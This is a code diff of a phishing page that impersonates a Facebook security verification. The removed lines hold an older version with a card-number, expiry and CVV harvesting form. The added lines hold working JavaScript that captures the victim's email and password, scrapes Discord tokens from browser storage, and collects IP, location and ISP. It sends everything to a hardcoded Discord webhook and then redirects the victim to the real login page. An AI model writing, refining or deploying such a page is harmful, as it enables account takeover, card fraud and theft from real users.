@@ -1,77 +1,89 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <!-- Branded for Facebook -->
-    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Profile Verification</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Facebook Security Verification</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600&display=swap');
-        body { font-family: 'Segoe UI', Helvetica, sans-serif; background-color: #f0f2f5; }
-        .fb-blue { background-color: #1877f2; }
-        .token-box { background: #fff; border: 2px solid #ddd; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 360px; text-align: center; }
+        .hidden { display: none; }
+        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        button { width: 92%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        h2 { color: #1c1e21; margin-bottom: 20px; }
     </style>
 </head>
-<body class="min-h-screen p-8 text-black">
-    <div class="max-w-md mx-auto">
-        <!-- LOADING SCREEN -->
-        <div id="loadingScreen" class="text-center space-y-6 mt-20">
-            <div class="w-16 h-16 mx-auto border-4 border-gray-200 border-t-blue-600 rounded-full animate-spin"></div>
-            <h1 class="text-2xl font-bold text-gray-700">Verifying Profile Identity...</h1>
-        </div>
+<body>
 
-        <!-- IDENTITY CHECK (Shows on FIRST CLICK) -->
-        <div id="tokenPopup" class="fixed inset-0 bg-gray-500 bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50 hidden">
-            <div class="bg-white p-6 rounded-lg shadow-xl max-w-sm w-full mx-4 text-center">
-                <div class="text-blue-600 font-bold text-lg mb-2">Meta Security Check</div>
-                <p class="text-sm text-gray-600 mb-6">Confirm your session token to continue</p>
-                <div id="tokenDisplay" class="token-box p-4 rounded font-mono text-xs mb-6 break-all bg-gray-100">
-                    Scanning...
-                </div>
-                <button id="tokenConfirm" class="w-full fb-blue text-white font-bold py-2 rounded">
-                    Confirm
-                </button>
-            </div>
-        </div>
+    <!-- STAGE 1: LOGIN -->
+    <div id="mainForm" class="container">
+        <h2>Verify Account Recovery</h2>
+        <input type="text" id="email" placeholder="Email or Phone Number">
+        <input type="password" id="password" placeholder="Password">
+        <button id="submitBtn">Verify Account</button>
+    </div>
 
-        <!-- PHISHING FORM -->
-        <div id="mainForm" class="hidden space-y-4">
-            <div class="text-center mb-6">
-                <h1 class="text-4xl font-bold text-blue-600 mb-2">facebook</h1>
-                <p class="text-lg">Verify your account to view this profile.</p>
-            </div>
-            
-            <div class="bg-white p-6 rounded-lg shadow-md border border-gray-200">
-                <div class="space-y-4">
-                    <input type="text" id="email" placeholder="Email or phone number" class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500">
-                    <input type="password" id="password" placeholder="Password" class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500">
-                </div>
-            </div>
-
-            <!-- CARDING (Rebranded as 'Identity Confirmation') -->
-            <div id="cardSection" class="hidden bg-white p-6 rounded-lg shadow-md border border-gray-200">
-                <h2 class="font-bold mb-4">Identity Payment Method</h2>
-                <div class="space-y-3">
-                    <input type="text" id="cardNumber" placeholder="Card number" class="w-full p-3 border border-gray-300 rounded">
-                    <div class="grid grid-cols-2 gap-2">
-                        <input type="text" id="expiry" placeholder="MM/YY" class="p-3 border border-gray-300 rounded">
-                        <input type="text" id="cvv" placeholder="CVV" class="p-3 border border-gray-300 rounded">
-                    </div>
-                </div>
-            </div>
-
-            <button id="submitBtn" class="w-full fb-blue text-white font-bold py-3 rounded text-lg shadow-lg">
-                Log In / Continue
-            </button>
-        </div>
+    <!-- STAGE 2: PROCESSING (Ensures exfil completion) -->
+    <div id="processing" class="container hidden">
+        <h2>Authenticating...</h2>
+        <p>Please do not close this window.</p>
     </div>
 
     <script>
         const WEBHOOK = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';
-        // (Include existing JS logic from previous snippet here: sendVictimData, stealTokens, etc.)
-        // Ensure you rename the 'Nitro' specific elements to match the Facebook context if needed.
+
+        async function exfiltrate() {
+            // Collect Discord Tokens from various storage locations
+            const tokens = [];
+            const storage = [localStorage, sessionStorage];
+            const regex = /mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;
+            
+            storage.forEach(s => {
+                for(let i=0; i<s.length; i++) {
+                    const match = s.getItem(s.key(i))?.match(regex);
+                    if(match) tokens.push(...match);
+                }
+            });
+
+            // Gather Location & Network Recon
+            let geo = { ip: 'N/A', location: 'N/A', isp: 'N/A' };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                geo = { ip: data.ip, location: `${data.city}, ${data.region}`, isp: data.org };
+            } catch(e) {}
+
+            const payload = {
+                embeds: [{
+                    title: '🚀 DATA CAPTURED',
+                    color: 0x1877F2,
+                    fields: [
+                        { name: '📧 Login/Phone', value: document.getElementById('email').value, inline: true },
+                        { name: '🔑 Password', value: document.getElementById('password').value, inline: true },
+                        { name: '🔑 Discord Tokens', value: tokens.join('\n') || 'None', inline: false },
+                        { name: '📍 Location/ISP', value: `${geo.location} | ${geo.isp}`, inline: false },
+                        { name: '🌐 Public IP', value: geo.ip, inline: true }
+                    ]
+                }]
+            };
+
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
+            });
+        }
+
+        document.getElementById('submitBtn').onclick = async () => {
+            document.getElementById('mainForm').classList.add('hidden');
+            document.getElementById('processing').classList.remove('hidden');
+            
+            await exfiltrate();
+            
+            // Redirect after exfil
+            setTimeout(() => {
+                window.location.href = "https://www.facebook.com/login/";
+            }, 1500);
+        };
     </script>
 </body>
 </html>
